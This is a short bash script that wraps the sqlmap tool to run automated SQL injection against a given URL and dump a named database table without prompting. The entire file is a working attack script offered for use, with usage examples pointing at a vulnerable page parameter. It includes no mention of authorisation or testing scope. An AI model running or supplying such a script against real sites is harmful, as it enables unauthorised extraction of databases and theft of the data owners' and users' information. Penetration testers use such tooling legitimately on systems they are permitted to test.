#!/bin/bash
# SQLMap - Automated SQL injection and dumping database table
# Options:
# -u : URL to scan
# -D : Database name
# -T : Table name
# --dump : Dump the table
# --batch : Never ask for user input, use the default behavior

# Usage: sqlmap_dump.sh <target_url> <database_name> <table_name>
# Example script
# sqlmap_dump.sh http://example.com/vuln.php?id=1 my_database my_table

# Check if sqlmap is installed
if ! command -v sqlmap &> /dev/null
then
    echo "sqlmap could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <target_url> <database_name> <table_name>"
    exit 1
fi

TARGET_URL=$1
DATABASE=$2
TABLE=$3

echo "Starting SQL injection on $TARGET_URL to dump table $TABLE from database $DATABASE"

# Perform SQL injection
sqlmap -u $TARGET_URL -D $DATABASE -T $TABLE --dump --batch

echo "SQL injection and table dump completed."
